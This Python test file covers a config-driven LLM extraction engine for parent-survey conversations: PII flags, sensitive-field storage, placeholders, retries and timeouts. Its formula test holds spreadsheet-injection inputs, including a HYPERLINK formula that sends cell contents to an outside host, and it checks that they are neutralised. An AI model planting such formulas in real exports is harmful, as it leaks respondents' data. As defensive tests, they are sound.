"""
Pure tests of the generic, config-driven parts of the extraction engine: typed `pii.types`, `placeholders`,
`prompt_variables`, the `limits` guards, what is stored for sensitive fields and for PII-flagged sessions, the
neutralised spreadsheet formulas, the non-retryable classification of deterministic failures and the activity timeout.
A fake LLM only (no network). SYNTHETIC data only.
"""
import asyncio
import json

import pytest

import app.database.feedback_extraction_operations as ops
from app.services import feedback_extraction as fx
from app.services import feedback_extraction_constants as constants


def _raw(**extra):
    raw = {
        "schema_version": 1, "persona": "Parent", "session_type": "Parent_Voice", "prompt_name": "Some Prompt",
        "fields": [
            {"name": "district", "kind": "free_text", "description": "The district."},
            {"name": "gender", "kind": "category", "description": "Gender.", "categories": ["Male", "Female"]},
            {"name": "age", "kind": "integer", "description": "Age.", "min": 0, "max": 1},
            {"name": "disability", "kind": "category", "description": "Disability.", "categories": ["Yes", "No"],
             "sensitive": True},
            {"name": "disability_type", "kind": "free_text", "description": "Kind.", "sensitive": True},
            {"name": "income", "kind": "category", "description": "Income.", "categories": ["Low", "High"],
             "sensitive": True, "store_raw": True},
        ],
    }
    raw.update(extra)
    return raw


def _config(**extra):
    return fx.parse_extraction_config(_raw(**extra))


def _row(seq, text, answer=True, english=None):
    return {"sequence": seq, "parent_id": 1 if answer else None, "question_key": None, "message": text,
            "translated_message": english}


def _answer(pii=(False, []), **entries):
    names = ("district", "gender", "age", "disability", "disability_type", "income")
    fields = {n: {"value": None, "raw": None} for n in names}
    for name, entry in entries.items():
        fields[name] = entry
    return json.dumps({"fields": fields, "pii": {"detected": pii[0], "types": pii[1]}})


def _by_name(result):
    return {f.field_name: f for f in result.fields}


SYSTEM = "{{persona}} | {{field_names}}\n{{fields}}\n{{pii_types}}\n{{output_format}}"
USER = "BEGIN {{conversation_id}}\n{{conversation}}\nEND"


# ------------------------------------------------------------------------------------------------ A11 prompt_name, variables

def test_prompt_name_is_required_by_the_parser():
    raw = _raw()
    del raw["prompt_name"]
    with pytest.raises(fx.ExtractionConfigError, match="prompt_name"):
        fx.parse_extraction_config(raw)


def test_the_code_has_no_generic_prompt_fallback_any_more():
    assert not hasattr(constants, "PROMPT_NAME")
    source = open(ops.__file__, encoding="utf-8").read()
    assert "PROMPT_NAME" not in source


def test_prompt_variables_are_validated():
    assert _config(prompt_variables={"programme_context": " a school survey "}).prompt_variables == {
        "programme_context": "a school survey"}
    for bad in ({"persona": "x"}, {"Bad-Name": "x"}, {"a": ""}, {"a": 5}, {"a": "x" * 4001}, [], "x",
                {f"v{i}": "x" for i in range(21)}):
        with pytest.raises(fx.ExtractionConfigError):
            _config(prompt_variables=bad)


def test_prompt_variables_fill_the_prompt_in_one_pass_and_cannot_pull_in_other_variables():
    config = _config(prompt_variables={"programme_context": "Context says {{conversation}} and {{fields}}"})
    conversation = fx.build_conversation([_row(1, "hello {{programme_context}} {{persona}}")])
    prompt = fx.render_prompt("CTX: {{programme_context}} / {{persona}}", USER, config, conversation)
    assert "CTX: Context says {{conversation}} and {{fields}} / Parent" in prompt     # not expanded a second time
    assert "hello {{programme_context}} {{persona}}" in prompt                         # respondent text stays literal
    assert prompt.count("hello") == 1


def test_a_template_variable_the_config_does_not_define_still_fails_loudly():
    with pytest.raises(fx.PromptRenderError, match="unknown variable"):
        fx.render_prompt("{{programme_context}}", USER, _config(), fx.build_conversation([_row(1, "x")]))


# ------------------------------------------------------------------------------------------------ A12 typed pii.types

def test_pii_types_may_be_names_or_objects_with_a_description_which_reaches_the_prompt():
    config = _config(pii={"types": [
        {"name": "child_name", "description": "the name of the child or of a sibling"},
        "phone",
        {"name": "other", "description": "anything else that identifies a person"},
    ]})
    assert config.pii_types == ("child_name", "phone", "other")
    prompt = fx.render_prompt(SYSTEM, USER, config, fx.build_conversation([_row(1, "x")]))
    assert "- child_name: the name of the child or of a sibling" in prompt
    assert "- phone: a phone number" in prompt                       # a plain name keeps the neutral built-in description
    assert "- other: anything else that identifies a person" in prompt
    assert "as named" not in prompt


def test_a_plain_name_without_any_description_is_rendered_as_named():
    prompt = fx.render_prompt(SYSTEM, USER, _config(pii={"types": ["guardian_name", "other"]}),
                              fx.build_conversation([_row(1, "x")]))
    assert "- guardian_name: as named" in prompt


@pytest.mark.parametrize("types", [
    [{"name": "x"}], [{"name": "x", "description": ""}], [{"name": "x", "description": "d", "more": 1}],
    [{"name": "other", "description": 5}], [{"name": "X", "description": "d"}, "other"], ["other", "other"],
    [{"name": "other", "description": "d"}, "other"], [5], ["Other"],
])
def test_a_bad_pii_types_entry_is_refused(types):
    with pytest.raises(fx.ExtractionConfigError):
        _config(pii={"types": types})


def test_a_model_type_named_in_the_config_is_kept_and_an_unknown_one_becomes_other():
    config = _config(pii={"types": [{"name": "child_name", "description": "d"}, "other"]})
    result = fx.parse_model_response(_answer(pii=(True, ["Child Name", "phone"])), config)
    assert result.pii_types == ("child_name", "other")


# ------------------------------------------------------------------------------------------------ A12 placeholders

def test_placeholders_in_another_language_are_config_not_code():
    answer = _answer(district={"value": "नहीं पता", "raw": "नहीं पता"})
    default_field = _by_name(fx.parse_model_response(answer, _config()))["district"]
    assert default_field.status == "extracted"                       # the built-in list is English only
    config = _config(placeholders=["नहीं पता", "n/a"])
    field = _by_name(fx.parse_model_response(answer, config))["district"]
    assert (field.status, field.value, field.raw_value) == ("not_provided", "Not answered", None)


def test_the_placeholders_list_replaces_the_built_in_one():
    config = _config(placeholders=["nahi pata"])
    field = _by_name(fx.parse_model_response(_answer(district={"value": "N/A", "raw": None}), config))["district"]
    assert field.status == "extracted"                               # 'n/a' is no placeholder of this program
    field = _by_name(fx.parse_model_response(_answer(district={"value": "Nahi Pata.", "raw": None}), config))["district"]
    assert field.status == "not_provided"


@pytest.mark.parametrize("bad", [[], "n/a", [5], [""], ["   "], ["x" * 101], ["a"] * 501])
def test_a_bad_placeholders_value_is_refused_or_empty(bad):
    if bad == []:
        assert _config(placeholders=[]).placeholders == frozenset()     # an explicit empty list: nothing is a placeholder
        return
    with pytest.raises(fx.ExtractionConfigError):
        _config(placeholders=bad)


# ------------------------------------------------------------------------------------------------ B3 sensitive and flagged

def test_a_sensitive_field_does_not_store_the_respondents_words_unless_store_raw_is_set():
    answer = _answer(
        gender={"value": "Female", "raw": "girl"},
        disability={"value": "Yes", "raw": "my son has a hearing problem"},
        disability_type={"value": "hearing impairment", "raw": "my son cannot hear well"},
        income={"value": "Low", "raw": "we earn 2 lakh"})
    fields = _by_name(fx.parse_model_response(answer, _config()))
    assert (fields["gender"].value, fields["gender"].raw_value) == ("Female", "girl")                # not sensitive: kept
    assert (fields["disability"].value, fields["disability"].raw_value, fields["disability"].status) == ("Yes", None, "extracted")
    assert fields["disability_type"].raw_value is None and fields["disability_type"].value == "hearing impairment"
    assert fields["income"].raw_value == "we earn 2 lakh"                                            # store_raw: true


def test_an_unmapped_sensitive_answer_keeps_its_status_but_not_the_words():
    answer = _answer(disability={"value": "sometimes", "raw": "my son sometimes cannot hear"})
    field = _by_name(fx.parse_model_response(answer, _config()))["disability"]
    assert (field.status, field.value, field.raw_value) == ("unmapped", "Invalid response", None)


def test_store_raw_must_be_a_boolean_and_can_switch_raw_off_for_a_plain_field():
    with pytest.raises(fx.ExtractionConfigError, match="store_raw"):
        _config(fields=[{"name": "d", "kind": "free_text", "description": "d", "store_raw": "yes"}])
    config = _config(fields=[{"name": "district", "kind": "free_text", "description": "d", "store_raw": False}])
    answer = json.dumps({"fields": {"district": {"value": "Mysuru", "raw": "mysore"}}, "pii": {"detected": False, "types": []}})
    field = _by_name(fx.parse_model_response(answer, config))["district"]
    assert (field.value, field.raw_value) == ("Mysuru", None)


def test_a_pii_flagged_session_keeps_everything_it_extracted():
    """The flag marks the session; the data stays in our system and the export query decides what to leave out."""
    rows = [_row(1, "Your district?", answer=False), _row(2, "Mysuru, call me on 9876543210")]
    answer = _answer(district={"value": "Mysuru", "raw": "Mysuru, call me"}, gender={"value": "Female", "raw": "girl"},
                     income={"value": "Low", "raw": "we earn 2 lakh"}, age={"value": 1, "raw": "1"})
    run = fx.extract(rows, _config(), SYSTEM, USER, lambda prompt: (answer, {}))
    assert run.result.pii_detected is True                          # forced by the pre-check, the model said false
    fields = _by_name(run.result)
    assert fields["district"].raw_value == "Mysuru, call me" and fields["gender"].raw_value == "girl"   # the words are kept
    assert fields["district"].value == "Mysuru" and fields["district"].status == "extracted"          # free text: value kept
    assert fields["gender"].value == "Female" and fields["age"].value == "1" and fields["income"].value == "Low"


def test_a_session_that_is_not_flagged_keeps_its_values_and_words():
    run = fx.extract([_row(1, "Mysuru")], _config(), SYSTEM, USER,
                     lambda prompt: (_answer(district={"value": "Mysuru", "raw": "mysore"}), {}))
    field = _by_name(run.result)["district"]
    assert run.result.pii_detected is False and (field.value, field.raw_value) == ("Mysuru", "mysore")


# ------------------------------------------------------------------------------------------------ B10 formulas

@pytest.mark.parametrize("value", ['=HYPERLINK("http://example.org/"&A1,"x")', "+1+1", "-2+3", "@SUM(1+1)"])
def test_a_free_text_value_that_a_spreadsheet_would_run_is_not_stored_as_a_value(value):
    field = _by_name(fx.parse_model_response(_answer(district={"value": value, "raw": None}), _config()))["district"]
    assert field.status == "unmapped" and field.value == "Invalid response"
    assert field.raw_value == "'" + value                           # kept for review, neutralised for export


def test_raw_text_with_a_formula_prefix_is_neutralised_and_other_text_is_untouched():
    field = _by_name(fx.parse_model_response(
        _answer(gender={"value": "Male", "raw": "=1+1"}, district={"value": "Mysuru", "raw": "a=b"}), _config()))
    assert field["gender"].raw_value == "'=1+1" and field["gender"].value == "Male"
    assert field["district"].raw_value == "a=b"


# ------------------------------------------------------------------------------------------------ D10 bool on integer

def test_a_boolean_is_never_an_integer_even_when_the_range_would_hold_it():
    for value in (True, False):
        field = _by_name(fx.parse_model_response(_answer(age={"value": value, "raw": None}), _config()))["age"]
        assert (field.status, field.value) == ("unmapped", "Invalid response")
        assert field.raw_value == ("true" if value else "false")
    field = _by_name(fx.parse_model_response(_answer(age={"value": 1, "raw": None}), _config()))["age"]
    assert (field.status, field.value) == ("extracted", "1")          # a real 1 is fine


# ------------------------------------------------------------------------------------------------ B15 conversation cap

def test_a_conversation_over_the_total_cap_makes_no_call_and_is_flagged():
    config = _config(limits={"max_respondent_message_chars": 500, "max_conversation_chars": 1000})
    rows = [_row(i, "x" * 300, answer=(i % 2 == 0)) for i in range(1, 8)]
    calls = []
    run = fx.extract(rows, config, SYSTEM, USER, lambda prompt: calls.append(prompt) or ("{}", {}))
    assert calls == [] and run.llm_called is False and run.skip_reason == fx.SKIP_TOO_LONG
    assert run.result.pii_detected is True and run.result.pii_types == ("other",)
    assert {f.status for f in run.result.fields} == {"unmapped"}


def test_a_conversation_under_the_cap_is_sent():
    rows = [_row(1, "Q", answer=False), _row(2, "Mysuru")]
    calls = []
    fx.extract(rows, _config(limits={"max_respondent_message_chars": 500, "max_conversation_chars": 1000}), SYSTEM, USER,
               lambda prompt: calls.append(prompt) or (_answer(), {}))
    assert len(calls) == 1


# ------------------------------------------------------------------------------------------------ C8 retry classification

def _classify(exc, attempt=1):
    from app.temporal.feedback_extraction_activity import classify_failure
    return classify_failure(exc, attempt)


@pytest.mark.parametrize("exc", [
    fx.ExtractionConfigError("bad config"), fx.PromptRenderError("unknown variable"),
    ops.ExtractionSetupError("No prompt named 'x' exists in the database."),
    ValueError("submission 1 (tenant t) is not a stored feedback session"),
    ops.LlmCallError("LLM call failed (RuntimeError, HTTP 400)", 400),
    ops.LlmCallError("LLM call failed (RuntimeError, HTTP 401)", 401),
    ops.LlmCallError("LLM call failed (RuntimeError, HTTP 404)", 404),
])
def test_deterministic_failures_are_not_retried(exc):
    failure = _classify(exc)
    assert failure is not None and failure.non_retryable is True and failure.type == type(exc).__name__


@pytest.mark.parametrize("exc", [
    ops.LlmCallError("LLM call failed (RuntimeError, HTTP 429)", 429),
    ops.LlmCallError("LLM call failed (RuntimeError, HTTP 503)", 503),
    ops.LlmCallError("LLM call failed (RuntimeError, HTTP 408)", 408),
    ops.LlmCallError("LLM call failed (TimeoutError)", None),
    ops.StaleExtractionError("session changed"),
    RuntimeError("anything else"),
])
def test_transient_failures_are_still_retried(exc):
    assert _classify(exc) is None


def test_a_bad_model_answer_is_retried_once():
    assert _classify(fx.ExtractionOutputError("model answer is not valid JSON"), attempt=1) is None
    second = _classify(fx.ExtractionOutputError("model answer is not valid JSON"), attempt=2)
    assert second is not None and second.non_retryable is True


def test_the_non_retryable_error_carries_no_respondent_or_provider_text():
    secret = "zzq-secret-9876543210"
    failure = _classify(ops.sanitize_llm_error(RuntimeError(f"OpenRouter request failed with HTTP 400: echo {secret}")))
    assert failure is not None and secret not in str(failure) and "HTTP 400" in str(failure)


class _Pool:
    """Just enough of a pool for extract_submission: the loading phase raises or hands out the inputs."""

    def __init__(self, conn):
        self.conn = conn
        self.log_calls = 0

    def acquire(self):
        pool = self

        class _Ctx:
            async def __aenter__(self):
                return pool.conn

            async def __aexit__(self, *exc):
                return False
        return _Ctx()


def test_no_llm_log_row_is_written_when_no_call_was_made(monkeypatch):
    config = _config()
    logged = []

    async def fake_inputs(conn, submission_id, tenant_code):
        return {"session_type": "Parent_Voice", "questionnaire_version": "V1",
                "rows": [_row(1, "Q", answer=False), _row(2, "Mysuru")], "fingerprint": "f", "loaded_at": None,
                "config_row": {"id": "cv", "config": config}, "closing_keys": []}

    async def fake_prompt(conn, config):      # a template that uses a variable nobody defines
        return {"id": "pv", "name": "Some Prompt", "system_prompt": "{{nobody_defines_this}}", "user_prompt": USER}

    async def fake_log(*args, **kwargs):
        logged.append(args)

    monkeypatch.setattr(ops, "load_submission_inputs", fake_inputs)
    monkeypatch.setattr(ops, "load_prompt_for_config", fake_prompt)
    monkeypatch.setattr(ops, "_log_failed_call", fake_log)
    llm_calls = []

    def llm(prompt, **kwargs):
        llm_calls.append(prompt)
        return "{}", {}

    with pytest.raises(fx.PromptRenderError):
        asyncio.run(ops.extract_submission(_Pool(object()), "s1", "t", llm_function=llm, write=True))
    assert llm_calls == [] and logged == []                         # nothing was called, nothing is logged


def test_a_failed_call_is_logged_once_as_before(monkeypatch):
    config = _config()
    logged = []

    async def fake_inputs(conn, submission_id, tenant_code):
        return {"session_type": "Parent_Voice", "questionnaire_version": "V1",
                "rows": [_row(1, "Q", answer=False), _row(2, "Mysuru")], "fingerprint": "f", "loaded_at": None,
                "config_row": {"id": "cv", "config": config}, "closing_keys": []}

    async def fake_prompt(conn, config):
        return {"id": "pv", "name": "Some Prompt", "system_prompt": SYSTEM, "user_prompt": USER}

    async def fake_log(*args, **kwargs):
        logged.append(args)

    monkeypatch.setattr(ops, "load_submission_inputs", fake_inputs)
    monkeypatch.setattr(ops, "load_prompt_for_config", fake_prompt)
    monkeypatch.setattr(ops, "_log_failed_call", fake_log)

    def llm(prompt, **kwargs):
        return "not json", {"prompt_tokens": 3}

    with pytest.raises(fx.ExtractionOutputError):
        asyncio.run(ops.extract_submission(_Pool(object()), "s1", "t", llm_function=llm, write=True))
    assert len(logged) == 1


# ------------------------------------------------------------------------------------------------ A20 timeout

@pytest.mark.parametrize("llm_timeout, expected", [
    (None, 300), (0, 300), (True, 300), ("60", 300), (60, 300), (90, 300), (91, 302), (180, 480), (600, 1320),
    (1200, 2520), (1740, 3600), (3480, 3600), (10000, 3600),
])
def test_the_activity_timeout_follows_the_llm_timeout_within_bounds(llm_timeout, expected):
    assert constants.extraction_activity_timeout_seconds(llm_timeout) == expected


@pytest.mark.parametrize("llm_timeout", [60, 90, 180, 600, 1200])
def test_the_masking_call_and_the_extraction_call_each_get_the_full_timeout_inside_the_activity_budget(llm_timeout):
    budget = constants.extraction_activity_timeout_seconds(llm_timeout)
    masking = ops.clamp_llm_timeout(llm_timeout, budget, 0)
    extraction = ops.clamp_llm_timeout(llm_timeout, budget, masking)      # the masking call used its whole timeout
    assert (masking, extraction) == (llm_timeout, llm_timeout)


def test_a_configured_llm_timeout_above_the_ceiling_is_refused_by_the_parser():
    assert _config(llm={"timeout_seconds": constants.MAX_LLM_TIMEOUT_SECONDS}).llm["timeout_seconds"] == 3480
    with pytest.raises(fx.ExtractionConfigError, match="timeout_seconds"):
        _config(llm={"timeout_seconds": constants.MAX_LLM_TIMEOUT_SECONDS + 1})


def test_the_workflow_derives_the_extraction_timeout_instead_of_a_fixed_five_minutes():
    source = open(ops.__file__.replace("database/feedback_extraction_operations.py", "temporal/workflows.py"),
                  encoding="utf-8").read()
    block = source[source.index("elif step_name in FEEDBACK_PROCESS_STEP_NAMES"):source.index("Unsupported step name")]
    assert "extraction_activity_timeout_seconds(effective_llm_timeout)" in block
    assert "timedelta(minutes=5)" not in block
    assert 'step_name == "feedback_metadata_extraction"' not in source           # the registry, not a literal


def _patch_inputs(monkeypatch, config):
    async def fake_inputs(conn, submission_id, tenant_code):
        return {"session_type": "Parent_Voice", "questionnaire_version": "V1", "rows": [_row(1, "x")],
                "fingerprint": "f", "loaded_at": None, "config_row": {"id": "cv", "config": config}, "closing_keys": []}

    async def fake_prompt(conn, config):
        return {"id": "pv", "name": "Some Prompt", "system_prompt": SYSTEM, "user_prompt": USER}

    monkeypatch.setattr(ops, "load_submission_inputs", fake_inputs)
    monkeypatch.setattr(ops, "load_prompt_for_config", fake_prompt)


def _run_with_budget(monkeypatch, config, budget, overrides=None):
    """Runs a dry-run extraction under an activity budget; returns the keyword arguments the fake LLM received."""
    _patch_inputs(monkeypatch, config)
    seen = []

    def llm(prompt, **kwargs):
        seen.append(kwargs)
        return _answer(), {}

    asyncio.run(ops.extract_submission(_Pool(object()), "s1", "t", llm_function=llm, write=False,
                                       llm_overrides=overrides, activity_budget_seconds=budget))
    return seen


def test_a_configured_timeout_that_does_not_fit_the_activity_budget_is_clamped_and_the_call_runs(monkeypatch, caplog):
    """The reviewer's case: config 200 s, no step override: the budget is 300 s, so 200 + 120 does not fit. It used to
    fail EVERY submission with a non-retryable setup error; now the call runs with 300 - 120 = 180 s."""
    caplog.set_level("WARNING", logger="analytics_service.feedback_extraction")
    seen = _run_with_budget(monkeypatch, _config(llm={"timeout_seconds": 200}), 300)
    assert len(seen) == 1 and seen[0]["timeout"] == 180
    warnings = [r.getMessage() for r in caplog.records if r.levelname == "WARNING"]
    assert len(warnings) == 1 and "200" in warnings[0] and "180" in warnings[0]


def test_a_configured_timeout_that_fits_the_budget_is_untouched_and_not_reported(monkeypatch, caplog):
    caplog.set_level("WARNING", logger="analytics_service.feedback_extraction")
    assert _run_with_budget(monkeypatch, _config(llm={"timeout_seconds": 180}), 300)[0]["timeout"] == 180
    assert _run_with_budget(monkeypatch, _config(llm={"timeout_seconds": 60}), 300)[0]["timeout"] == 60
    assert _run_with_budget(monkeypatch, _config(llm={"timeout_seconds": 1000}), None)[0]["timeout"] == 1000   # CLI: no budget
    assert [r for r in caplog.records if r.levelname == "WARNING"] == []


def test_the_step_override_still_wins_and_a_bigger_budget_keeps_a_longer_call(monkeypatch):
    config = _config(llm={"timeout_seconds": 200})
    assert _run_with_budget(monkeypatch, config, 720, {"llm_timeout_seconds": 600})[0]["timeout"] == 600
    assert _run_with_budget(monkeypatch, config, 320)[0]["timeout"] == 200        # 200 + 120 fits exactly
    # the override is clamped as well when it somehow exceeds the budget
    assert _run_with_budget(monkeypatch, config, 300, {"llm_timeout_seconds": 600})[0]["timeout"] == 180


def test_the_llm_settings_precedence_is_unchanged_by_the_clamp():
    config = _config(llm={"model": "cfg/model", "max_tokens": 111, "timeout_seconds": 200})
    assert ops.resolve_llm_settings(config, {}) == {"model": "cfg/model", "max_tokens": 111, "timeout": 200}
    assert ops.resolve_llm_settings(config, {"llm_model": "step/model", "max_tokens": 5, "llm_timeout_seconds": 9}) == {
        "model": "step/model", "max_tokens": 5, "timeout": 9}


@pytest.mark.parametrize("budget", [constants.ACTIVITY_MARGIN_SECONDS, constants.ACTIVITY_MARGIN_SECONDS - 1, 0, -5])
def test_only_a_budget_with_nothing_left_for_the_call_is_a_setup_error(monkeypatch, budget):
    _patch_inputs(monkeypatch, _config(llm={"timeout_seconds": 200}))
    calls = []
    with pytest.raises(ops.ExtractionSetupError, match="activity budget"):
        asyncio.run(ops.extract_submission(_Pool(object()), "s1", "t", llm_function=lambda *a, **k: calls.append(1),
                                           write=False, activity_budget_seconds=budget))
    assert calls == []


def test_the_default_activity_budget_always_holds_the_default_llm_timeout():
    """The workflow's floor of 300 s leaves 180 s: the clamp is only ever hit by a config timeout above 180 s."""
    assert constants.extraction_activity_timeout_seconds(None) - constants.ACTIVITY_MARGIN_SECONDS == 180


def test_a_failure_while_saving_still_carries_the_usage_of_the_calls_that_were_billed(monkeypatch):
    config = _config()

    async def fake_inputs(conn, submission_id, tenant_code):
        return {"session_type": "Parent_Voice", "questionnaire_version": "V1",
                "rows": [_row(1, "Q", answer=False), _row(2, "Mysuru")], "fingerprint": "f", "identity": None,
                "loaded_at": None, "config_row": {"id": "cv", "config": config}, "closing_keys": []}

    async def fake_prompt(conn, config):
        return {"id": "pv", "name": "Some Prompt", "system_prompt": SYSTEM, "user_prompt": USER}

    async def database_down(*args, **kwargs):
        raise RuntimeError("the database went away")

    monkeypatch.setattr(ops, "load_submission_inputs", fake_inputs)
    monkeypatch.setattr(ops, "load_prompt_for_config", fake_prompt)
    monkeypatch.setattr(ops, "save_extraction", database_down)
    answer = json.dumps({"fields": {name: {"value": None, "raw": None} for name in config.field_names()},
                         "pii": {"detected": False, "types": []}})

    def llm(prompt, **kwargs):
        return answer, {"prompt_tokens": 3, "completion_tokens": 2}

    with pytest.raises(RuntimeError) as raised:
        asyncio.run(ops.extract_submission(_Pool(object()), "s1", "t", llm_function=llm, write=True))
    assert raised.value.usage["prompt_tokens"] == 3 and raised.value.usage["completion_tokens"] == 2
